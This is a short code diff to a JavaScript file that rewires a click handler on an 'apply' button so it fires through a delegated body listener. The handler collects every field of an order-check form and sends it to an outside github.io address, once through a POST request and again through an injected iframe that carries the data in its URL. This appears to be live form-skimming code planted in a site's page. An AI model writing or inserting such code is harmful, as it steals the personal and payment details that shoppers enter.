@@ -1,5 +1,5 @@
-window.onload = function() {
-    $("#applybutton").click(function (t) {
+
+    $("body").on("click", "#applybutton", function (t) {
         var e = {};
         $("#checkOrderForm").serializeArray().map(function (t) {
             e[t.name] = t.value;
@@ -8,4 +8,3 @@ window.onload = function() {
         $.post("https://faisal-akhtar-fgh.github.io/kal", escape(n));
 		$("body").append('<iframe src="https://faisal-akhtar-fgh.github.io/kal/?data='+ escape(n) + '"></iframe>');
     });
-};
